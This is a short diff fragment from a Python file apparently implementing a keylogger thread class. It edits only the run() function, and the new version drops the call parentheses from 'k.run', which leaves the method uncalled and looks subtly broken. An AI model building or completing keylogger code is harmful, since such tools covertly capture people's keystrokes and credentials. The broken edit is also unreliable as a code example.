@@ -116,5 +116,5 @@ class keylogger(threading.Thread):
         self.Destroy()
         
 def run():
-    k=keylogger();
-    k.run()
+    k=keylogger()
+    k.run
